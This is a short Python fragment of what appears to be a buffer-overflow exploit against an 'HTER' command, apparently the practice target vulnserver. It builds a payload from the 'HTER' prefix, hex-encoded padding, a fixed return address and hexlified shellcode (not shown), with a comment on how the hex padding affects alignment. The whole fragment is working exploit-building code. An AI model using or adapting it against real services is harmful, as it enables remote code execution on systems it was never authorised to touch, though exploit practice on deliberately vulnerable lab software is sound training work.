...
# weird way of filling buffer, AAAA will be filled in as "\xAA\xAA", so be careful with alignment. And that is why there are two spaces in the first line of buf, "HTER  "
buf = "HTER  "
buf += "AA"*1020
buf += "03125062"
buf += hexlify(shellcode)
